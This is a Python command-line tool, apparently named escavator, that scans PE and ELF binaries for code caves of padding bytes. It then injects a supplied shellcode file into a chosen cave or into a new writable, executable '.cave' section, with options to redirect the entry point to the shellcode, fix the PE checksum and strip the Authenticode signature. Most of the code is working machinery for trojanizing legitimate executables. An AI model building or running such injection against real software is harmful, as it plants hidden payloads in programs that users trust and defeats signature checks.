#!/usr/bin/env python3
import argparse
import mmap
import os
import shutil
import sys
import hashlib
import csv
import json
import logging
import time

try:
    import lief
except ImportError:
    print("Error: LIEF library not installed. Install via 'pip install lief'", file=sys.stderr)
    sys.exit(1)

# Capstone for disassembly-based filtering
try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64, CS_ARCH_ARM, CS_MODE_ARM, CS_ARCH_ARM64
    CAPSTONE_AVAILABLE = True
except ImportError:
    CAPSTONE_AVAILABLE = False

from colorama import init as colorama_init, Fore, Style
colorama_init(autoreset=True)

# Fallback for PE section flags/types if needed
try:
    SEC_CHAR = lief.PE.SECTION_CHARACTERISTICS
    SEC_TYPE = lief.PE.SECTION_TYPES
except AttributeError:
    class _SecChar:
        MEM_READ = 0x40000000
        MEM_WRITE = 0x80000000
        MEM_EXECUTE = 0x20000000
    SEC_CHAR = _SecChar()
    class _SecType:
        DATA = 0x00000002
    SEC_TYPE = _SecType()


def compute_sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()


def extract_metadata(path: str):
    binary = lief.parse(path)
    raw_fmt = binary.format.name.upper()  # e.g. "PE32", "PE64", "ELF", "MACHO"
    if raw_fmt.startswith("PE"):
        fmt = "PE"
    elif raw_fmt.startswith("ELF"):
        fmt = "ELF"
    elif raw_fmt.startswith("MACHO"):
        fmt = "MACHO"
    else:
        fmt = raw_fmt

    hdr = binary.header
    if fmt == 'PE':
        arch = str(hdr.machine)
        sect_align = binary.optional_header.section_alignment
    elif fmt == 'ELF':
        arch = str(hdr.machine_type)
        sect_align = hdr.section_alignment
    else:
        arch = "UNKNOWN"
        sect_align = 1

    meta = {
        'format': fmt,
        'architecture': arch,
        'entrypoint': hex(binary.entrypoint),
        'section_alignment': sect_align,
        'sections': []
    }

    for sec in binary.sections:
        if fmt == 'PE':
            offset = sec.pointerto_raw_data
            size   = sec.size
        else:
            offset = sec.offset
            size   = sec.size
        meta['sections'].append({
            'name': sec.name,
            'offset': offset,
            'size': size
        })

    return binary, meta


def find_caves_in_region(mm, pattern: bytes, min_size: int,
                         region_start: int, region_end: int,
                         progress_interval: int):
    runs = []
    total = region_end - region_start
    if total <= 0:
        return runs

    seq = pattern * min_size
    pos = region_start
    last_pct = -1
    start_time = time.time()
    bar_len = 30

    while pos < region_end:
        idx = mm.find(seq, pos, region_end)
        if idx == -1:
            break

        if progress_interval > 0:
            processed = idx - region_start
            pct = int(processed * 100 / total)
            if pct >= last_pct + progress_interval:
                elapsed = time.time() - start_time
                speed = processed / elapsed if elapsed > 0 else 0
                eta = (total - processed) / speed if speed > 0 else 0
                filled = int(pct * bar_len / 100)
                bar = '#' * filled + '-' * (bar_len - filled)
                sys.stdout.write(
                    f"\r{Fore.CYAN}Scanning: [{bar}] {pct:3d}% ETA: {int(eta):3d}s{Style.RESET_ALL}"
                )
                sys.stdout.flush()
                last_pct = pct

        start = idx
        end = start + min_size
        while end + len(pattern) <= region_end and mm[end:end + len(pattern)] == pattern:
            end += len(pattern)
        runs.append((start, end - start))
        pos = end

    if progress_interval > 0:
        bar = '#' * bar_len
        sys.stdout.write(
            f"\r{Fore.CYAN}Scanning: [{bar}] 100% ETA:   0s{Style.RESET_ALL}\n"
        )
        sys.stdout.flush()

    return runs


def compute_stats(runs: list):
    sizes = sorted(r['size'] for r in runs)
    if not sizes:
        return {}
    import statistics
    stats = {
        'count': len(sizes),
        'min': sizes[0],
        'max': sizes[-1],
        'mean': statistics.mean(sizes),
        'median': statistics.median(sizes),
        'percentiles': {
            '25': statistics.quantiles(sizes, n=4)[0],
            '50': statistics.median(sizes),
            '75': statistics.quantiles(sizes, n=4)[2],
            '90': sizes[int(len(sizes) * 0.9)]
        },
        'histogram': []
    }
    bins = 10
    bin_counts = [0] * bins
    rmin, rmax = stats['min'], stats['max']
    span = rmax - rmin or 1
    for s in sizes:
        idx = min((s - rmin) * bins // span, bins - 1)
        bin_counts[idx] += 1
    max_count = max(bin_counts)
    width = 40
    for i, count in enumerate(bin_counts):
        bar = '#' * (count * width // max_count) if max_count else ''
        bmin = rmin + i * span // bins
        bmax = rmin + ((i + 1) * span // bins)
        stats['histogram'].append(f"{bmin:>6}-{bmax:<6}: {bar}")
    return stats


def is_non_code(r, mm, cs):
    start, length = r['offset'], r['size']
    sample_len = min(length, 32)
    code = mm[start:start + sample_len]
    for _ in cs.disasm(bytes(code), start):
        return False
    return True


def write_csv(path: str, runs: list):
    with open(path, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile, quoting=csv.QUOTE_MINIMAL)
        writer.writerow(['pattern', 'offset', 'size'])
        for r in runs:
            writer.writerow([r['pattern'], hex(r['offset']), r['size']])


def parse_args():
    epilog = """\
Examples:
  # Scan only .data and .rsrc sections for padding
  escavator.py target.bin --scan-sections .data,.rsrc

  # Skip .text, interactive injection, require 0x100 alignment
  escavator.py target.bin --skip-sections .text --inject shell.bin --interactive --align 0x100

  # If no cave, add new section and update PE checksum
  escavator.py target.bin --inject shell.bin --add-section --update-checksum

  # Disassembly-filtered scan, top 5 biggest caves, export to CSV
  escavator.py target.bin --disasm-filter --top 5 --export runs.csv

  # JSON output including metadata and stats
  escavator.py target.bin --json
"""
    parser = argparse.ArgumentParser(
        description="Map code caves and optionally inject shellcode.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=epilog
    )
    parser.add_argument('input', help="Path to target binary")
    parser.add_argument('-p', '--pattern', action='append',
                        help=r"Byte pattern (e.g. '\x00'); repeatable")
    parser.add_argument('--pattern-file',
                        help="File with one hex-pattern per line")
    parser.add_argument('-m', '--min-size', type=int, default=32,
                        help="Minimum run length in bytes")
    parser.add_argument('--min-offset', type=lambda s: int(s, 0),
                        help="Minimum start offset (inclusive)")
    parser.add_argument('--max-offset', type=lambda s: int(s, 0),
                        help="Maximum start offset (inclusive)")
    parser.add_argument('--scan-sections',
                        help="Comma-separated list of section names to scan",
                        type=lambda s: s.split(','))
    parser.add_argument('--skip-sections',
                        help="Comma-separated list of section names to skip",
                        type=lambda s: s.split(','))
    parser.add_argument('--top', type=int,
                        help="Show only top N largest caves")
    parser.add_argument('-e', '--export',
                        help="Path to CSV export of runs")
    parser.add_argument('-i', '--inject',
                        help="Path to shellcode file to inject")
    parser.add_argument('--add-section', action='store_true',
                        help="If no cave is found, add a new section for injection")
    parser.add_argument('--update-checksum', action='store_true',
                        help="Recalculate and update PE checksum post-injection")
    parser.add_argument('--strip-cert', action='store_true',
                        help="Strip Authenticode certificate from PE file")
    parser.add_argument('--align', type=lambda s: int(s, 0),
                        help="Require injection offset alignment (bytes)")
    parser.add_argument('--disasm-filter', action='store_true',
                        help="Skip runs that disassemble into valid instructions")
    parser.add_argument('--interactive', action='store_true',
                        help="Interactively select a cave for injection")
    parser.add_argument('--progress-interval', type=int, default=5,
                        help="Percent interval for scanning progress (0 to disable)")
    parser.add_argument('--redirect-ep', action='store_true',
                        help="Redirect entry point to injected shellcode RVA")
    parser.add_argument('--json', action='store_true',
                        help="Output full results as JSON")
    parser.add_argument('--no-color', action='store_true',
                        help="Disable colored output")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help="Enable debug logging")
    parser.add_argument('--log-file',
                        help="Path to log file (default: stderr)")
    return parser.parse_args()


def main():
    args = parse_args()

    handlers = [logging.FileHandler(args.log_file)] if args.log_file else [logging.StreamHandler()]
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        handlers=handlers,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    logger = logging.getLogger()

    if args.no_color or args.json:
        class NC:
            RESET_ALL = CYAN = GREEN = RED = YELLOW = MAGENTA = ''
        global Fore, Style
        Fore = Style = NC()

    if not os.path.isfile(args.input):
        logger.error("Input file not found: %s", args.input)
        sys.exit(1)

    binary, meta = extract_metadata(args.input)
    logger.debug("Metadata: %s", meta)

    patterns = args.pattern or []
    if args.pattern_file:
        try:
            with open(args.pattern_file) as pf:
                for line in pf:
                    ln = line.strip()
                    if ln:
                        patterns.append(ln)
        except Exception as e:
            logger.error("Failed to read pattern file: %s", e)
            sys.exit(1)

    # Default pattern depends on format
    if not patterns:
        patterns = ['\\x00']

    pattern_bytes = []
    for p in patterns:
        try:
            raw = bytes(p, 'utf-8').decode('unicode_escape').encode('latin-1')
            pattern_bytes.append({'text': p, 'bytes': raw})
            logger.debug("Pattern %s → %s", p, raw)
        except Exception:
            logger.error("Invalid pattern: %s", p)
            sys.exit(1)

    if args.min_size < max(len(pb['bytes']) for pb in pattern_bytes):
        logger.error("--min-size must be >= longest pattern length")
        sys.exit(1)

    original_sha = compute_sha256(args.input)
    file_size = os.path.getsize(args.input)
    logger.info("Original SHA256: %s", original_sha)

    sections = meta['sections']
    if args.scan_sections:
        regions = [s for s in sections if s['name'] in args.scan_sections]
    elif args.skip_sections:
        regions = [s for s in sections if s['name'] not in args.skip_sections]
    else:
        regions = [{'name': '<entire>', 'offset': 0, 'size': file_size}]

    runs = []
    with open(args.input, 'rb') as f, mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
        for pb in pattern_bytes:
            for sec in regions:
                name = sec['name']
                start_off = sec['offset']
                end_off = start_off + sec['size']
                if args.progress_interval > 0:
                    print(f"{Fore.GREEN}Scanning section '{name}' "
                          f"[{hex(start_off)}–{hex(end_off)}]{Style.RESET_ALL}")
                found = find_caves_in_region(
                    mm, pb['bytes'], args.min_size,
                    start_off, end_off,
                    args.progress_interval
                )
                for off, sz in found:
                    runs.append({'pattern': pb['text'], 'offset': off, 'size': sz})
    runs.sort(key=lambda r: r['offset'])

    if args.min_offset is not None:
        runs = [r for r in runs if r['offset'] >= args.min_offset]
    if args.max_offset is not None:
        runs = [r for r in runs if r['offset'] <= args.max_offset]
    if args.align:
        runs = [r for r in runs if r['offset'] % args.align == 0]

    if args.disasm_filter:
        if not CAPSTONE_AVAILABLE:
            logger.error("Capstone is required for --disasm-filter")
            sys.exit(1)
        m = binary.header.machine if meta['format'] == 'PE' else binary.header.machine_type
        mname = m.name.upper()
        if "AMD64" in mname or "X86_64" in mname:
            arch, mode = CS_ARCH_X86, CS_MODE_64
        elif "I386" in mname or "I686" in mname or "X86" in mname:
            arch, mode = CS_ARCH_X86, CS_MODE_32
        elif "ARM64" in mname or "AARCH64" in mname:
            arch, mode = CS_ARCH_ARM64, CS_MODE_ARM
        elif "ARM" in mname:
            arch, mode = CS_ARCH_ARM, CS_MODE_ARM
        else:
            logger.error("Unsupported architecture for disasm-filter: %s", mname)
            sys.exit(1)
        cs = Cs(arch, mode)
        with open(args.input, 'rb') as f2, mmap.mmap(f2.fileno(), 0, access=mmap.ACCESS_READ) as mm2:
            runs = [r for r in runs if is_non_code(r, mm2, cs)]

    stats = compute_stats(runs)
    display_runs = runs if not args.top else sorted(runs, key=lambda r: r['size'], reverse=True)[:args.top]

    output = {
        'metadata': meta,
        'original_sha256': original_sha,
        'stats': stats,
        'runs': runs
    }

    if args.json:
        print(json.dumps(output, indent=2))
        sys.exit(0)

    # Human-readable summary
    print(f"{Fore.BLUE}=== Metadata ==={Style.RESET_ALL}")
    print(f" Format       : {meta['format']}")
    print(f" Architecture : {meta['architecture']}")
    print(f" Entry Point  : {meta['entrypoint']}")
    print(f" Section Align: {meta['section_alignment']} bytes\n")

    print(f"{Fore.BLUE}=== Scan Results ==={Style.RESET_ALL}")
    print(f"Found {len(runs)} runs in {file_size} bytes")
    if stats:
        print(f"\n{Fore.BLUE}--- Statistics ---{Style.RESET_ALL}")
        print(f" Count   : {stats['count']}")
        print(f" Min     : {stats['min']} bytes")
        print(f" Max     : {stats['max']} bytes")
        print(f" Mean    : {stats['mean']:.2f} bytes")
        print(f" Median  : {stats['median']} bytes")
        print(f" 90th % : {stats['percentiles']['90']} bytes\n")
        print(f"{Fore.BLUE}--- Size Distribution ---{Style.RESET_ALL}")
        for line in stats['histogram']:
            print(f" {line}")
    else:
        print("No runs found.\n")

    if display_runs:
        print(f"\n{Fore.BLUE}--- Runs ---{Style.RESET_ALL}")
        for idx, r in enumerate(display_runs, 1):
            print(f" [{idx:2d}] Offset {r['offset']:#x}, Size {r['size']:5d}, Pattern '{r['pattern']}'")

    if args.export:
        try:
            write_csv(args.export, runs)
            print(f"\n{Fore.GREEN}Exported runs to {args.export}{Style.RESET_ALL}")
        except Exception as e:
            logger.error("Error exporting CSV: %s", e)
            sys.exit(1)

    if args.inject:
        if not os.path.isfile(args.inject):
            logger.error("Shellcode file not found: %s", args.inject)
            sys.exit(1)
        shellcode = open(args.inject, 'rb').read()
        dest = args.input + '.injected'

        if args.add_section:
            shell_size = len(shellcode)
            align_val = args.align or meta['section_alignment']
            pad = (-shell_size) % align_val
            sec_size = shell_size + pad

            if meta['format'] == 'PE':
                sec = lief.PE.Section(".cave")
                sec.virtual_size = sec_size
                sec.characteristics = SEC_CHAR.MEM_READ | SEC_CHAR.MEM_WRITE | SEC_CHAR.MEM_EXECUTE
                sec.content = list(shellcode) + [0] * pad
                binary.add_section(sec, SEC_TYPE.DATA)
                if args.redirect_ep:
                    binary.optional_header.addressof_entrypoint = sec.virtual_address
                builder = lief.PE.Builder(binary)
                builder.build()
                if args.update_checksum:
                    builder.patch_pe_checksum()
                if args.strip_cert:
                    try:
                        binary.remove_data_directory(lief.PE.DATA_DIRECTORY.CERTIFICATE)
                    except Exception:
                        pass
                builder.write(dest)
                inj_start = sec.pointerto_raw_data

            elif meta['format'] == 'ELF':
                sec = lief.ELF.Section(".cave")
                sec.type = lief.ELF.SECTION_TYPES.PROGBITS
                sec.flags = (lief.ELF.SECTION_FLAGS.ALLOC |
                             lief.ELF.SECTION_FLAGS.WRITE |
                             lief.ELF.SECTION_FLAGS.EXECINSTR)
                sec.content = list(shellcode) + [0] * pad
                binary.add(sec)
                binary.write(dest)
                inj_start = sec.offset

            else:
                logger.error("Add-section not supported for format: %s", meta['format'])
                sys.exit(1)

            inj_end = inj_start + shell_size
            new_sha = compute_sha256(dest)
            print(f"\n{Fore.BLUE}=== Injection ==={Style.RESET_ALL}")
            print(f" New section '.cave' added, size {sec_size} bytes")
            print(f" Shellcode injected at {inj_start:#x}–{inj_end:#x}")
            print(f" Injected file: {dest}")
            print(f" New SHA256   : {new_sha}")

        else:
            if not runs:
                logger.error("No suitable cave found and --add-section not specified")
                sys.exit(1)

            if args.interactive:
                print(f"\n{Fore.BLUE}Select a run for injection:{Style.RESET_ALL}")
                for idx, r in enumerate(display_runs, 1):
                    print(f" [{idx}] Offset {r['offset']:#x}, Size {r['size']} bytes")
                choice = input("Enter run number: ").strip()
                try:
                    sel = display_runs[int(choice) - 1]
                except Exception:
                    logger.error("Invalid selection")
                    sys.exit(1)
            else:
                sel = runs[0]

            inj_start = sel['offset']
            inj_end = inj_start + len(shellcode)
            shutil.copy2(args.input, dest)
            with open(dest, 'r+b') as df, mmap.mmap(df.fileno(), 0) as mmw:
                mmw[inj_start:inj_end] = shellcode

            if args.update_checksum or args.strip_cert:
                bin2 = lief.parse(dest)
                builder = lief.PE.Builder(bin2)
                builder.build()
                if args.update_checksum:
                    builder.patch_pe_checksum()
                if args.strip_cert:
                    try:
                        bin2.remove_data_directory(lief.PE.DATA_DIRECTORY.CERTIFICATE)
                    except Exception:
                        pass
                builder.write(dest)

            if args.redirect_ep and meta['format'] == 'PE':
                bin2 = lief.parse(dest)
                sec2 = next(
                    (s for s in bin2.sections
                     if inj_start >= s.pointerto_raw_data and
                        inj_start < s.pointerto_raw_data + s.size),
                    None
                )
                if not sec2:
                    logger.error("Cannot locate section for EP redirection")
                    sys.exit(1)
                rva = sec2.virtual_address + (inj_start - sec2.pointerto_raw_data)
                orig_ep = bin2.entrypoint
                bin2.optional_header.addressof_entrypoint = rva
                builder = lief.PE.Builder(bin2)
                builder.build()
                builder.patch_pe_checksum()
                builder.write(dest)
                print(f"{Fore.MAGENTA}Entry point redirected from {hex(orig_ep)} to {hex(rva)}{Style.RESET_ALL}")

            new_sha = compute_sha256(dest)
            print(f"\n{Fore.BLUE}=== Injection ==={Style.RESET_ALL}")
            print(f" Shellcode injected at {inj_start:#x}–{inj_end:#x}")
            print(f" Injected file: {dest}")
            print(f" New SHA256   : {new_sha}")

    sys.exit(0)


if __name__ == '__main__':
    main()
